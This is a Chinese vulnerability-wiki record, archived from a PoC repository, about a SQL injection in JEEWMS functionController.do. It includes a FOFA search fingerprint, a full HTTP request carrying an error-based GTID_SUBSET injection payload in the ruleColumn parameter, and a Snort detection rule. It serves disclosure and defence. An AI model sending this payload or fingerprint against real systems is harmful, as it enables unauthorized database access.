---
schema_version: "1"
id: "VW-20261117-c42371dd5f19"
title: "JEEWMS functionController.do SQL注入漏洞"
product: "JEEWMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
identifier_role: "unknown"
version: "当前已发所有版本"
prerequisites: "来源未完整说明认证/角色/配置前提；不假定匿名可达；FOFA 指纹已在原文"
side_effects: "unknown；复现前核对写入、凭据、出网与恢复要求"
source: "SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/11/JEEWMS functionController.do SQL注入漏洞/JEEWMS functionController.do SQL注入漏洞.md"
---

<!-- vulwiki-editorial:start -->
## 校订与适用边界

### 本次收录记录
- 2026-11-17 周维护收录：来源 SourByte05/Vulnerability-Wiki-PoC；文本全文审阅完成；未执行任何 PoC、依赖安装或目标访问。
- 触发材料（请求/指纹/规则）保留在下方原文中，未做脱敏或删改。
- CVE/产品查重：无重复主入口（本库 master 6314 篇正文级搜索无既有条目）

### 尚未解决的证据缺口
- 影响版本为来源声明，未与厂商公告逐一核对
- 复现截图像素未查看，技术结论以原文文字为准
- 修复状态为来源声明，需按分支核对补丁版本
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

> 以下为来源原文全文（保留原始字节，含广告与联系方式的保留原文）。

# JEEWMS functionController.do SQL注入漏洞

JEEWMS functionController.do SQL注入漏洞

# 影响版本

当前已发所有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**   **body=&quot;plug-in/lhgDialog/lhgdialog.min.js?skin=metro&quot;**

**POC/EXP：**

**step1**  sql注入

```
GET /rest/../functionController.do?saverule&ruleColumn=1'+AND+GTID_SUBSET(CONCAT(0x716b717871,(SELECT+(ELT(5406=5406,1))),0x7162626a71),5406)--+CHdz&ruleConditions=1 HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0Accept: */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Length: 0


```

​![image](../../../.resource/remote/.resource/remote/14467ba2a87dda5117447da880cf4a211dc2131578e68442ece07b99cdd0ad98.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"JEEWMS - functionController.do ruleColumn SQL注入漏洞 (GTID_SUBSET报错注入)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/functionController.do"; fast_pattern;
        content:"saverule"; nocase; distance:0;
        content:"ruleColumn="; nocase; distance:0;
        content:"GTID_SUBSET"; nocase; distance:0; within:50;
        content:"CONCAT"; nocase; distance:0; within:50;
        content:"SELECT"; nocase; distance:0; within:50;
    metadata:
        service http,
        affected_product "JEEWMS",
        vulnerability_type "SQL Injection (Error-based)",
        severity "high";
    classtype:web-application-attack;
    sid:1000811;
    rev:1;
    priority:1;
)
```

# 漏洞修复

#### 官方修复

* **升级至安全版本**：联系官方获取针对该漏洞的安全补丁或升级版本。

‍

---

> 来源：SourByte05/Vulnerability-Wiki-PoC（原文见文首链接，归档 URL 见 frontmatter source_url）